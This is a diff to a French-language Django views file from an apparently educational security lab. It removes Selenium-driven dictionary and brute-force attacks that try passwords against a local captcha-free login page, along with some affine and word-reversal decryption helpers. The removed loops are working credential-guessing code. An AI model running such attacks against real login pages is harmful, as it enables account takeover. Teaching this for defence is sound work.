@@ -17,9 +17,6 @@ import requests
 from django.db.models import F
 
 
-
-
-chemin_driver_chrome = ''
 chemin_dictionnaire = "C:\password_3char_01.txt"
 chemin_dictionnaire1 = "C:\password_5char_number.txt"
 
@@ -222,65 +219,8 @@ def attaquedictionnaire_requests(username):
 
 
 
-###### views
-#attaque par selenium
-def attaque_dictionnaire(request):
-    if request.method == 'GET':
-        return render(request, 'attaque_dictionnaire.html')
-
-    if request.method == 'POST':
-        username = request.POST.get('username')
-        success, password, temp_execution = attaquedictionnaire(username)
-
-        if success:
-            context = {
-                'success' : success,
-                'password': password,
-                'temp_execution': temp_execution
-            }
-            return render(request, 'attaque_dictionnaire.html', context)
-        else:
-            context = {
-                'nosuccess': True,
-                'temp_execution': temp_execution,
-            }
-            return render(request, 'attaque_dictionnaire.html', context)    
-
-
        
             
-#### fonction #########
-def attaquedictionnaire(username):
-    driver = webdriver.Chrome(chemin_driver_chrome)
-    debut_time = time.time()
-
-    with open(chemin_dictionnaire1, "r") as f:
-        mots_de_passe = f.read().splitlines()
-
-    success = False
-
-    for mot in mots_de_passe:
-        driver.get("http://127.0.0.1:8000/login_nocaptha/")
-        username_field = driver.find_element(By.NAME, "username")
-        password_field = driver.find_element(By.NAME, "password")
-        username_field.send_keys(username)
-        password_field.send_keys(mot)
-        connexion_button = driver.find_element(By.NAME, "button_login")
-        connexion_button.click()
-
-        if driver.current_url == "http://127.0.0.1:8000/home/":
-            fin_time = time.time()
-            success = True
-            break
-
-    #driver.quit()
-    temp_execution = fin_time - debut_time
-    if success:
-        return True, mot, temp_execution
-    else:
-        fin_time = time.time()
-        temp_execution = fin_time - debut_time
-        return False, None, temp_execution
 
 
 ##########################################################################
@@ -455,60 +395,6 @@ def attaquebruteforce_all_char_requests(username):
         return False, None, temp_execution
 
 
-
-# view
-# selenium  
-def attaque_brute_force(request):
-    if request.method == 'GET':
-        return render(request, 'brute_force.html')
-
-    if request.method == 'POST':
-        username = request.POST.get('username')
-        success, password, temp_execution = attaquebruteforce(username)
-
-        if success:
-            context = {
-                'success' : success,
-                'password': password,
-                'temp_execution': temp_execution
-            }
-            return render(request, 'brute_force.html', context)
-        else:
-            context = {
-                'nosuccess': True,
-                'temp_execution': temp_execution,
-            }
-            return render(request, 'brute_force.html', context) 
-
-
-
- # fonction           
-def attaquebruteforce(username):
-    driver = webdriver.Chrome(chemin_driver_chrome) 
-    success = False
-    debut_time = time.time()
-   
-    for password_generer in itertools.product(caracteres_all, repeat=password_length):
-        password1 = ''.join(password_generer)
-        driver.get("http://127.0.0.1:8000/login_nocaptha/")
-        username_field = driver.find_element(By.NAME, "username")
-        password_field = driver.find_element(By.NAME, "password")
-        username_field.send_keys(username)
-        password_field.send_keys(password1)
-        connexion_button = driver.find_element(By.NAME, "button_login")
-        connexion_button.click()
-
-        if driver.current_url == "http://127.0.0.1:8000/home/":
-            fin_time = time.time()
-            success = True
-            break
-
-
-    temp_execution = fin_time - debut_time
-    if success:
-        return True, password1, temp_execution
-    else:
-        return False, None, temp_execution
 
 
 
@@ -783,32 +669,8 @@ def trouver_inverse_modulaire(a, N):
         if (a * x) % N == 1:
             return x  # Trouver l'inverse modulaire de a
         
-def dechiffrement_affine1(texte_chiffre, a, b):
-    texte_clair = ""
-    N = 26  # Taille de l'alphabet 
-    
-    a_inverse = trouver_inverse_modulaire(a, N)  # Trouver l'inverse modulaire de 'a' modulo 26
-    if a_inverse is None:
-        raise ValueError("La valeur de 'a' n'est pas valide. Assurez-vous que 'a' est premier avec 26.")
 
-    for caractere in texte_chiffre:
-        if caractere.isalpha():  # Vérifie si le caractère est une lettre
-            est_majuscule = caractere.isupper()
-            C = ord(caractere) - ord('A' if est_majuscule else 'a')  # Conversion de la lettre chiffrée en position dans l'alphabet
-            P = (a_inverse * (C - b)) % N  # Formule de déchiffrement affine
-            texte_clair += chr(P + ord('A' if est_majuscule else 'a'))  # Conversion de la position en lettre d'origine
-        else:
-            texte_clair += caractere  # Si ce n'est pas une lettre, gardez-le tel quel
-    return texte_clair
-
-def inverse_modulaire(a, m):
-    g, x, y = pgcd(a, m)
-    if g != 1:
-        raise ValueError("L'inverse modulaire n'existe pas.")
-    else:
-        return x % m
-    
-    
+        
 def dechiffrement_affine(message, a, b):
     
     if a == 1 and (b == 0 or b == 26):
@@ -939,28 +801,6 @@ def crypter_palindrome(mot):
     caractere_milieu = mot[moitie] if len(mot) % 2 != 0 else ""
     mot_chiffre = partie_gauche + caractere_milieu + partie_droite
     return mot_chiffre
-
-
-def decrypter(resultat):
-    phrase = resultat.split()  # Séparer la phrase en mots
-    mots_inv= phrase[::-1]
-    text_dechiffrer = []
-    
-    for mot in mots_inv :
-        Word=mot.lower()
-        if is_palindrome(Word):
-            
-                mot_dechiffre = crypter_palindrome(mot)
-                text_dechiffrer.append(mot_dechiffre)
-        elif len(Word) == 3:  # Condition spéciale pour les palindromes de trois lettres
-            mot_chiffre = mot[0] + mot[2] + mot[1]
-            text_dechiffrer.append(mot_chiffre)
-            
-        else:
-            text_dechiffrer.append(mirror(mot))
-
-    return ' '.join(text_dechiffrer)  # Reconstruire la phrase à partir des mots dechiffrés
-
 
 
 def decrypt_mirroir(request):
